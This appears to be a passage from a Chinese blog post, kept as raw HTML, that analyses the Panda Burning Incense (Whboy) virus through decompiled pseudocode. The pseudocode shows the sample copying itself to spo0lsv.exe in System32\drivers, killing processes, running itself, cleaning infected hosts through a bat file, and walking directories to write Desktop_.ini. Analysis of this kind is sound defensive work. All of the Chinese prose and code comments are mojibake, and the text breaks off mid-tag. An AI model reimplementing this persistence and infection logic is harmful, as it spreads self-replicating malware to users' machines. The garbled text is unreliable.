 unknown_libname_108((<span class="hljs-type">int</span>)v53);<br>    System::__linkproc__ <span class="hljs-title function_">LStrCat3</span><span class="hljs-params">(&amp;v63, v53[<span class="hljs-number">0</span>], v63)</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( !v63 )                                   <span class="hljs-comment">// å¦‚æœv63ä¸ºç©ºï¼Œæ‹©è¿›å…¥ifåˆ†æ”¯ï¼Œå‰é¢å¯¹v63è¿›è¡Œäº†ä»€ä¹ˆæ“ä½œå®åœ¨æ²¡çœ‹å‡ºæ¥è‰¹</span><br>  &#123;<br>    System::ParamStr(<span class="hljs-number">0</span>);<br>    Sysutils::AnsiUpperCase(v52[<span class="hljs-number">2</span>]);            <span class="hljs-comment">// å­—ç¬¦å˜å¤§å†™</span><br>    n128 = v52[<span class="hljs-number">3</span>];<br>    GetSystemDirectory((<span class="hljs-type">int</span> *)&amp;v51);            <span class="hljs-comment">// è·å–C:\Windows\System32\ç³»ç»Ÿè·¯å¾„</span><br>    v32 = v51;<br>    ExceptionList = (<span class="hljs-keyword">struct</span> _EXCEPTION_REGISTRATION_RECORD *)aDrivers;<span class="hljs-comment">// &quot;drivers\\&quot;</span><br>    spo0lsv.exe = spo0lsv_exe;                  <span class="hljs-comment">// &quot;spo0lsv.exe&quot;</span><br>    System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(v52, <span class="hljs-number">3</span>)</span>;      <span class="hljs-comment">// æ‹¼æ¥ç”Ÿæˆç—…æ¯’è·¯å¾„C:\Windows\System32\drivers\spo0lsv.exe</span><br>    Sysutils::AnsiUpperCase(v52[<span class="hljs-number">0</span>]);            <span class="hljs-comment">// ç—…æ¯’è·¯å¾„è½¬å¤§å†™</span><br>    System::__linkproc__ <span class="hljs-title function_">LStrCmp</span><span class="hljs-params">(n128, v52[<span class="hljs-number">1</span>])</span>; <span class="hljs-comment">// æ¯”è¾ƒç—…æ¯’ç”Ÿæˆè·¯å¾„å’Œç¨‹åºè¿è¡Œè·¯å¾„æ˜¯å¦ç›¸ç­‰ï¼Œä¸ä¸€è‡´æ—¶äºç³»ç»Ÿç›®å½•åˆ›å»ºæ ·æœ¬</span><br>    <span class="hljs-keyword">if</span> ( !v6 )<br>    &#123;<br>      VirusKiller((<span class="hljs-type">int</span>)spo0lsv_exe);            <span class="hljs-comment">// killæ‰&quot;spo0lsv.exe&quot;è¿›ç¨‹</span><br>      VirusKiller((<span class="hljs-type">int</span>)spo0lsv_exe);            <span class="hljs-comment">// &quot;spo0lsv.exe&quot;</span><br>      n128 = <span class="hljs-number">128</span>;<br>      GetSystemDirectory((<span class="hljs-type">int</span> *)&amp;v49);          <span class="hljs-comment">// è·å–C:\Windows\System32\ç³»ç»Ÿè·¯å¾„</span><br>      v32 = v49;<br>      ExceptionList = (<span class="hljs-keyword">struct</span> _EXCEPTION_REGISTRATION_RECORD *)aDrivers;<span class="hljs-comment">// &quot;drivers\\&quot;</span><br>      System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v50, <span class="hljs-number">3</span>)</span>;   <span class="hljs-comment">// æ‹¼æ¥ç”Ÿæˆç—…æ¯’è·¯å¾„C:\Windows\System32\drivers\spo0lsv.exe</span><br>      n5 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v50);<span class="hljs-comment">// å­—ç¬¦ä¸²ç±»å‹è½¬æ¢</span><br>      SetFileAttributesA(n5, (DWORD)spo0lsv_exe);<span class="hljs-comment">// &quot;spo0lsv.exe&quot;</span><br>      Sleep(<span class="hljs-number">1u</span>);                                <span class="hljs-comment">// ä¼‘çœ </span><br>      spo0lsv.exe = <span class="hljs-number">0</span>;<br>      GetSystemDirectory(&amp;n9);                  <span class="hljs-comment">// è·å–C:\Windows\System32\ç³»ç»Ÿè·¯å¾„</span><br>      n10 = n9;<br>      drivers__ = aDrivers;                     <span class="hljs-comment">// &quot;drivers\\&quot;</span><br>      System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v48, <span class="hljs-number">3</span>)</span>;   <span class="hljs-comment">// æ‹¼æ¥ç”Ÿæˆç—…æ¯’è·¯å¾„C:\Windows\System32\drivers\spo0lsv.exe</span><br>      n1 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v48);<span class="hljs-comment">// å­—ç¬¦ä¸²ç±»å‹è½¬æ¢</span><br>      System::ParamStr(<span class="hljs-number">0</span>);<br>      n2 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v46[<span class="hljs-number">1</span>]);<span class="hljs-comment">// ç¨‹åºæ‰§è¡Œè·¯å¾„å­—ç¬¦ä¸²ç±»å‹è½¬æ¢</span><br>      CopyFileA(n2, n1, (BOOL)spo0lsv_exe);     <span class="hljs-comment">// æŠŠç—…æ¯’ç¨‹åºä»è¿è¡Œè·¯å¾„å¤åˆ¶ä¸ºC:\Windows\System32\drivers\</span><br><span class="hljs-comment">                                                // spo0lsv.exeï¼Œå¹¶è®¾ç½®FailIfExists=false,å³å¦‚æœç›®æ ‡æ–‡ä»¶å­˜åœ¨åˆ™è¦†ç›–</span><br>      ExceptionList_1 = <span class="hljs-number">1</span>;<br>      GetSystemDirectory(&amp;v45);                 <span class="hljs-comment">// è·å–C:\Windows\System32\ç³»ç»Ÿè·¯å¾„</span><br>      System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(v46, <span class="hljs-number">3</span>)</span>;    <span class="hljs-comment">// æ‹¼æ¥ç”Ÿæˆç—…æ¯’è·¯å¾„C:\Windows\System32\drivers\spo0lsv.exe</span><br>      n3 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v46[<span class="hljs-number">0</span>]);<span class="hljs-comment">// å­—ç¬¦ä¸²ç±»å‹è½¬æ¢</span><br>      WinExec(n3, (UINT)spo0lsv_exe);           <span class="hljs-comment">// è¿è¡ŒC:\Windows\System32\drivers\spo0lsv.exe</span><br>      ExitProcess_0(<span class="hljs-number">0</span>);                         <span class="hljs-comment">// ç»“æŸè¿›ç¨‹</span><br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>è‹¥è¿è¡Œç¨‹åºä¸ºæºç—…æ¯’ç¨‹åºï¼Œåˆ é™¤æºç—…æ¯’ç¨‹åºï¼Œé‡æ–°ç”ŸæˆC:\Windows\System32\drivers\spo0lsv.exe</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( !(<span class="hljs-type">unsigned</span> __int8)sub_405458(spo0lsv_exe) )<span class="hljs-comment">// åˆ¤æ–­å½“å‰è¿›ç¨‹æ˜¯å¦æ˜¯æºç—…æ¯’ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿›å…¥</span><br>    &#123;<br>      n128 = <span class="hljs-number">128</span>;<br>      GetSystemDirectory((<span class="hljs-type">int</span> *)&amp;v42);          <span class="hljs-comment">// è·å–C:\Windows\System32\ç³»ç»Ÿè·¯å¾„</span><br>      v32 = v42;<br>      ExceptionList = (<span class="hljs-keyword">struct</span> _EXCEPTION_REGISTRATION_RECORD *)aDrivers;<span class="hljs-comment">// &quot;drivers\\&quot;</span><br>      System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v43, <span class="hljs-number">3</span>)</span>;<br>      lpFileName_2 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v43);<br>      SetFileAttributesA(lpFileName_2, (DWORD)spo0lsv_exe);<span class="hljs-comment">// è®¾ç½®spo0lsv.exeå±æ€§</span><br>      Sleep(<span class="hljs-number">1u</span>);                                <span class="hljs-comment">// ä¼‘çœ </span><br>      GetSystemDirectory((<span class="hljs-type">int</span> *)&amp;uCmdShow);     <span class="hljs-comment">// è·å–C:\Windows\System32\ç³»ç»Ÿè·¯å¾„</span><br>      spo0lsv.exe = (<span class="hljs-type">char</span> *)uCmdShow;<br>      System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v41, <span class="hljs-number">3</span>)</span>;   <span class="hljs-comment">// æ‹¼æ¥ç”Ÿæˆç—…æ¯’è·¯å¾„C:\Windows\System32\drivers\spo0lsv.exe</span><br>      lpFileName_3 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v41);<span class="hljs-comment">// æ ¼å¼è½¬æ¢</span><br>      DeleteFileA(lpFileName_3);                <span class="hljs-comment">// åˆ é™¤æºç—…æ¯’</span><br>      n14 = unknown_libname_113(v64);           <span class="hljs-comment">// è·å–æºç—…æ¯’å¤§å°</span><br>      System::__linkproc__ <span class="hljs-title function_">LStrDelete</span><span class="hljs-params">(&amp;v64, n14 - v59, v59)</span>;<br>      n10 = unknown_libname_113(v64);           <span class="hljs-comment">// è·å–æºç—…æ¯’å¤§å°</span><br>      v19 = unknown_libname_113(v64);<br>      System::__linkproc__ <span class="hljs-title function_">LStrDelete</span><span class="hljs-params">(&amp;v64, v19, n10)</span>;<br>      System::__linkproc__ <span class="hljs-title function_">LStrLAsg</span><span class="hljs-params">(&amp;v61, v64)</span>; <span class="hljs-comment">// è·å–å­—ç¬¦ä¸²ä¿¡æ¯</span><br>      n10 = (<span class="hljs-type">int</span>)&amp;savedregs;<br>      drivers__ = (<span class="hljs-type">char</span> *)&amp;loc_408730;<br>      ExceptionList_1 = (<span class="hljs-type">int</span>)NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>      __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;ExceptionList_1);<br>      GetSystemDirectory(&amp;v38);                 <span class="hljs-comment">// è·å–C:\Windows\System32\ç³»ç»Ÿè·¯å¾„</span><br>      System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v39, <span class="hljs-number">3</span>)</span>;   <span class="hljs-comment">// æ‹¼æ¥ç”Ÿæˆç—…æ¯’è·¯å¾„C:\Windows\System32\drivers\spo0lsv.exe</span><br>      System::__linkproc__ <span class="hljs-title function_">Assign</span><span class="hljs-params">(v57, v39)</span>;<br>      *off_40E2BC = <span class="hljs-number">2</span>;<br>      n15 = System::__linkproc__ RewritText(v57);<span class="hljs-comment">// ä»¥å†™å…¥æ¨¡å¼æ‰“å¼€C:\Windows\System32\drivers\spo0lsv.exe</span><br>      System::__linkproc__ _IOTest(n15);<br>      n16 = System::__linkproc__ WriteLString((<span class="hljs-type">int</span>)v57, v61);<span class="hljs-comment">// ä»¥é™„åŠ æ¨¡å¼å†™å…¥</span><br>      v22 = System::__linkproc__ Flush(n16);<br>      System::__linkproc__ _IOTest(v22);<br>      v23 = System::__linkproc__ Close(v57);<br>      System::__linkproc__ _IOTest(v23);<br>      n10 = <span class="hljs-number">1</span>;<br>      GetSystemDirectory((<span class="hljs-type">int</span> *)&amp;drivers___1);  <span class="hljs-comment">// è·å–C:\Windows\System32\ç³»ç»Ÿè·¯å¾„</span><br>      drivers__ = drivers___1;<br>      ExceptionList_1 = (<span class="hljs-type">int</span>)aDrivers;          <span class="hljs-comment">// &quot;drivers\\&quot;</span><br>      System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v37, <span class="hljs-number">3</span>)</span>;   <span class="hljs-comment">// æ‹¼æ¥ç”Ÿæˆç—…æ¯’è·¯å¾„C:\Windows\System32\drivers\spo0lsv.exe</span><br>      n4 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v37);<span class="hljs-comment">// å­—ç¬¦ä¸²ç±»å‹è½¬æ¢</span><br>      WinExec(n4, (UINT)spo0lsv.exe);           <span class="hljs-comment">// è¿è¡Œç—…æ¯’ç¨‹åº</span><br>      __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)ExceptionList);<br>    &#125;<br>    ExitProcess_0(<span class="hljs-number">0</span>);                           <span class="hljs-comment">// é€€å‡º</span><br></code></pre></td></tr></table></figure><p>è‹¥è¿è¡Œç¨‹åºä¸ºè¢«æ„ŸæŸ“ç¨‹åºï¼Œå°†æºæ–‡ä»¶ä»è¢«æ„ŸæŸ“çš„æ–‡ä»¶ä¸­æå–å‡ºæ¥å¹¶è¦†å†™è¢«æ„ŸæŸ“çš„æ–‡ä»¶ã€‚äºä¸´æ—¶ç›®å½•ç”Ÿæˆbatæ‰¹å¤„ç†æ–‡ä»¶ï¼Œåˆ é™¤è¢«æ„ŸæŸ“çš„æ–‡ä»¶ï¼Œç›´æ¥ç»“æŸè¿›ç¨‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">n11 = unknown_libname_113((<span class="hljs-type">int</span>)v63);          <span class="hljs-comment">// å¦‚æœè¿è¡Œçš„æ˜¯è¢«æ„ŸæŸ“çš„ç¨‹åºï¼Œå¹¶éæºç—…æ¯’ç¨‹åºï¼Œèµ°è¿™ä¸ªåˆ†æ”¯</span><br>  System::__linkproc__ <span class="hljs-title function_">LStrDelete</span><span class="hljs-params">(&amp;v64, i, n11)</span>;<span class="hljs-comment">// åˆ é™¤å­—ç¬¦</span><br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)__linkproc__ LStrPos(dword_4087D8, v63) &gt; <span class="hljs-number">0</span> )<span class="hljs-comment">// æŸ¥æ‰¾å­—ç¬¦ä¸²</span><br>  &#123;<br>    __linkproc__ <span class="hljs-title function_">LStrPos</span><span class="hljs-params">(dword_4087D8, v63)</span>;    <span class="hljs-comment">// æŸ¥æ‰¾å­—ç¬¦ä¸²</span><br>    System::__linkproc__ <span class="hljs-title function_">LStrCopy</span><span class="hljs-params">(&amp;v60)</span>;        <span class="hljs-comment">// æŠŠè¢«æ„ŸæŸ“çš„ç¨‹åºåçš„å­—ç¬¦ä¸²æ‹·è´ï¼Œå…·ä½“æ˜¯Whboy+ç¨‹åºå</span><br>    System::__linkproc__ <span class="hljs-title function_">LStrDelete</span><span class="hljs-params">(&amp;v60, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>)</span>;<span class="hljs-comment">// åˆ é™¤æ‹·è´ä¸­çš„Whboy</span><br>    __linkproc__ <span class="hljs-title function_">LStrPos</span><span class="hljs-params">(&amp;dword_4087E4, v60)</span>;   <span class="hljs-comment">// æŸ¥æ‰¾å­—ç¬¦ä¸²</span><br>    System::__linkproc__ <span class="hljs-title function_">LStrCopy</span><span class="hljs-params">(&amp;v62)</span>;        <span class="hljs-comment">// æŠŠå»é™¤äº†Whboyå‰ç¼€çš„å­—ç¬¦ä¸²æ‹·è´å›æ¥</span><br>    n6 = __linkproc__ LStrPos(&amp;dword_4087E4, v60);<span class="hljs-comment">// æŸ¥æ‰¾å­—ç¬¦ä¸²ä¿¡æ¯</span><br>    System::__linkproc__ <span class="hljs-title function_">LStrDelete</span><span class="hljs-params">(&amp;v60, <span class="hljs-number">1</span>, n6)</span>;<span class="hljs-comment">// åˆ é™¤å­—ç¬¦ä¸²ä¿¡æ¯</span><br>    v59 = unknown_libname_91(v60);<br>    n128 = (<span class="hljs-type">int</span>)&amp;savedregs;<br>    v32 = &amp;loc_40857A;<br>    ExceptionList = NtCurrentTeb()-&gt;NtTib.ExceptionList;<span class="hljs-comment">// ä¸´æ—¶å¼‚å¸¸è®°å½•</span><br>    __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;ExceptionList);<br>    System::__linkproc__ <span class="hljs-title function_">Assign</span><span class="hljs-params">(v58, v62)</span>;      <span class="hljs-comment">// ç»‘å®šç›®æ ‡æ–‡ä»¶è·¯å¾„</span><br>    *off_40E2BC = <span class="hljs-number">2</span>;<br>    n7 = System::__linkproc__ RewritText(v58);  <span class="hljs-comment">// ä»¥å†™å…¥æ¨¡å¼æ‰“å¼€å½“å‰æ–‡ä»¶</span><br>    System::__linkproc__ _IOTest(n7);           <span class="hljs-comment">// æµ‹è¯•IOåŠŸèƒ½</span><br>    unknown_libname_113(v64);                   <span class="hljs-comment">// è¯»å–è¢«æ„ŸæŸ“ç—…æ¯’æ–‡ä»¶çš„å¤§å°</span><br>    System::__linkproc__ <span class="hljs-title function_">LStrCopy</span><span class="hljs-params">(&amp;v44)</span>;        <span class="hljs-comment">// å°†æºæ–‡ä»¶ä»è¢«æ„ŸæŸ“çš„æ–‡ä»¶ä¸­æå–å‡ºæ¥</span><br>    n12 = System::__linkproc__ WriteLString((<span class="hljs-type">int</span>)v58, v44);<span class="hljs-comment">// ä»¥é™„åŠ æ–¹å¼å†™å…¥ï¼Œä½¿è¢«æ„ŸæŸ“çš„æ–‡ä»¶è¢«åˆ·æ–°æˆæœªè¢«æ„ŸæŸ“çš„æ–‡ä»¶</span><br>    n13 = System::__linkproc__ Flush(n12);      <span class="hljs-comment">// åˆ·æ–°ç¼“å†²åŒº</span><br>    System::__linkproc__ _IOTest(n13);<br>    v15 = System::__linkproc__ Close(v58);<br>    System::__linkproc__ _IOTest(v15);<br>    __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)ExceptionList);<br>    writebatfile();                             <span class="hljs-comment">// ç”Ÿæˆbatæ–‡ä»¶å¹¶è¿è¡Œï¼Œåˆ é™¤æ—§æ–‡ä»¶ï¼Œç›´æ¥è·³åˆ°ä¸‹é¢ç»“æŸè¿›ç¨‹</span><br></code></pre></td></tr></table></figure><h2 id="sub-0x40d18c"><a href="#sub-0x40d18c" class="headerlink" title="sub_0x40d18c"></a>sub_0x40d18c</h2><h3 id="sub-40a5b0"><a href="#sub-40a5b0" class="headerlink" title="sub_40a5b0"></a>sub_40a5b0</h3><p>åˆ›å»ºäº†å¤šçº¿ç¨‹</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002094944.png"></p><p>è¿›å»ä¸€çœ‹ï¼Œæ˜¯ä¸ªå¾ªç¯éå†çš„æ“ä½œ</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002103717.png"></p><h4 id="sub-409348"><a href="#sub-409348" class="headerlink" title="sub_409348"></a>sub_409348</h4><p>å¥½å®¶ä¼™ï¼Œè¿›å»ä¸€çœ‹å…¨æ˜¯å„ç§æ–‡ä»¶å¤¹å­—ç¬¦ä¸²</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002103838.png"></p><p>å®šä½åˆ°æ ¸å¿ƒä»£ç æ®µï¼Œæ‰€ä»¥å¯å¾—æ­¤å¤„åŠŸèƒ½ä¸ºéå†ç›®å½•ï¼Œåˆ›å»ºDesktop_.ini</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c">      System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(v94, <span class="hljs-number">3</span>)</span>;<br>      <span class="hljs-keyword">if</span> ( !(<span class="hljs-type">unsigned</span> __int8)Sysutils::FileExists(v94[<span class="hljs-number">0</span>]) )<span class="hljs-comment">// å½“å‰ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨Desktop_.iniï¼Œè‹¥ä¸å­˜åœ¨</span><br>      &#123;<br>        n128_3 = <span class="hljs-number">128</span>;<br>        System::AnsiString_1 = n128_1;<br>        ExceptionList = (<span class="hljs-keyword">struct</span> _EXCEPTION_REGISTRATION_RECORD *)System::AnsiString;<br>        __Desktop_.ini = (<span class="hljs-type">int</span> *)aDesktopIni_1;  <span class="hljs-comment">// &quot;\\Desktop_.ini&quot;</span><br>        System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v82, <span class="hljs-number">3</span>)</span>; <span class="hljs-comment">// è·¯å¾„æ‹¼æ¥</span><br>        lpFileName = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v82);<br>        SetFileAttributesA(lpFileName, (DWORD)ExceptionList);<span class="hljs-comment">// è®¾ç½®å±æ€§</span><br>        Sleep(<span class="hljs-number">1u</span>);<br>        GetLocalTime(&amp;SystemTime);              <span class="hljs-comment">// è·å–å½“å‰æ—¶é—´</span><br>        sub_40576C(SystemTime.wYear, (<span class="hljs-type">int</span>)&amp;ExceptionList_2);<span class="hljs-comment">// å¹´</span><br>        ExceptionList = ExceptionList_2;<br>        __Desktop_.ini = _Desktop__ini;<br>        sub_40576C(SystemTime.wMonth, (<span class="hljs-type">int</span>)&amp;__Desktop_.ini_3);<span class="hljs-comment">// æœˆ</span><br>        __Desktop_.ini_2 = __Desktop_.ini_3;<br>        ExceptionList_1 = (<span class="hljs-keyword">struct</span> _EXCEPTION_REGISTRATION_RECORD *)_Desktop__ini;<br>        sub_40576C(SystemTime.wDay, (<span class="hljs-type">int</span>)&amp;dwFileAttributes_3);<span class="hljs-comment">// æ—¥</span><br>        dwFileAttributes_1 = dwFileAttributes_3;<br>        System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v101, <span class="hljs-number">5</span>)</span>;<br>        System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v78, <span class="hljs-number">3</span>)</span>;<br>        Mxdsql::ShowSQLWindow(v101, v78);       <span class="hljs-comment">// åˆ›å»ºå¹¶å†™å…¥æ—¥æœŸ</span><br>        System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v77, <span class="hljs-number">3</span>)</span>;<br>        lpFileName_1 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v77);<br>        SetFileAttributesA(lpFileName_1, dwFileAttributes_1);<span class="hljs-comment">// è®¾ç½®æ–‡ä»¶å±æ€§</span><br>        Sleep(<span class="hljs-number">1u</span>);<br>LABEL_32:<br>        System::__linkproc__ <span class="hljs-title function_">LStrCat3</span><span class="hljs-params">(&amp;n128, n128_1, System::AnsiString)</span>;<br>        sub_409348(n128, a2, a3, a4);           <span class="hljs-comment">// è‡ªå¾ªç¯</span><br>LABEL_59:<br>        Sleep(<span class="hljs-number">0x14</span>u);<br>        <span class="hljs-keyword">goto</span> LABEL_60;<br>      &#125;                                         <span class="hljs-comment">// æ­¤å¤„æ˜¯å­˜åœ¨Desktop_.iniï¼ŒæŠŠå…¶æ—¶é—´è¯»å–ï¼Œä¸å½“å‰æ—¶é—´æ¯”å¯¹ï¼Œè‹¥ä¸ç›¸ç­‰ï¼Œå†™å…¥å½“å‰æ—¶é—´</span><br>      n128_3 = (<span class="hljs-type">int</span>)n128_1;<br>      System::AnsiString_1 = (<span class="hljs-type">char</span> *)System::AnsiString;<br>      ExceptionList = (<span class="hljs-keyword">struct</span> _EXCEPTION_REGISTRATION_RECORD *)aDesktopIni_1;<span class="hljs-comment">// &quot;\\Desktop_.ini&quot;</span><br>      System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v93, <span class="hljs-number">3</span>)</span>;<br>      sub_407650(v93, &amp;v102, a2, a3, a4);<br>      GetLocalTime(&amp;SystemTime);<br>      sub_40576C(SystemTime.wYear, (<span class="hljs-type">int</span>)&amp;System::AnsiString_2);<br>      System::AnsiString_1 = System::AnsiString_2;<br>      ExceptionList = (<span class="hljs-keyword">struct</span> _EXCEPTION_REGISTRATION_RECORD *)_Desktop__ini;<span class="hljs-comment">// è·å–æ—¶é—´</span><br>      sub_40576C(SystemTime.wMonth, (<span class="hljs-type">int</span>)&amp;__Desktop_.ini_1);<br>      __Desktop_.ini = __Desktop_.ini_1;<br>      __Desktop_.ini_2 = _Desktop__ini;<br>      sub_40576C(SystemTime.wDay, (<span class="hljs-type">int</span>)&amp;ExceptionList_3);<br>      ExceptionList_1 = ExceptionList_3;<br>      System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v101, <span class="hljs-number">5</span>)</span>;<br>      System::__linkproc__ <span class="hljs-title function_">LStrCmp</span><span class="hljs-params">(v102, v101)</span>;<br>      <span class="hljs-keyword">if</span> ( !v5 )<br>      &#123;<br>        System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v88, <span class="hljs-number">3</span>)</span>;<br>        lpFileName_2 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v88);<br>        SetFileAttributesA(lpFileName_2, <span class="hljs-number">0x80</span>u);<br>        Sleep(<span class="hljs-number">1u</span>);<br>        GetLocalTime(&amp;SystemTime);<br>        sub_40576C(SystemTime.wYear, (<span class="hljs-type">int</span>)&amp;dwFileAttributes);<br>        dwFileAttributes_2 = dwFileAttributes;<br>        sub_40576C(SystemTime.wMonth, (<span class="hljs-type">int</span>)&amp;v86);<br>        sub_40576C(SystemTime.wDay, (<span class="hljs-type">int</span>)&amp;v85);<br>        System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v101, <span class="hljs-number">5</span>)</span>;<br>        System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v84, <span class="hljs-number">3</span>)</span>;<br>        Mxdsql::ShowSQLWindow(v101, v84);<br>        System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v83, <span class="hljs-number">3</span>)</span>;<br>        lpFileName_3 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v83);<br>        SetFileAttributesA(lpFileName_3, dwFileAttributes_2);<br>        Sleep(<span class="hljs-number">1u</span>);<br>        <span class="hljs-keyword">goto</span> LABEL_32;<br>      &#125;<br>      System::__linkproc__ <span class="hljs-title function_">LStrCat3</span><span class="hljs-params">(&amp;v89, n128_1, System::AnsiString)</span>;<br>      sub_4087E8(v89);                          <span class="hljs-comment">// å¦ä¸€ä¸ªè‡ªå¾ªç¯</span><br></code></pre></td></tr></table></figure><h4 id="sub-407f00"><a href="#sub-407f00" class="headerlink" title="sub_407f00"></a>sub_407f00</h4><p>çœ‹åˆ°è¿™ä¸ª0xa00000è­¦è§‰èµ·æ¥ï¼Œå¤§äº10Mbå¤§å°çš„æ–‡ä»¶æ²¡æœ‰è¢«æ„ŸæŸ“ï¼Œäºæ˜¯çŒœæµ‹æ„ŸæŸ“çš„æ ¸å¿ƒä»£ç å°±åœ¨é™„è¿‘</p><p>æœ€ç»ˆå®šä½åˆ°å‡½æ•°sub_0x7f00</p><p><img 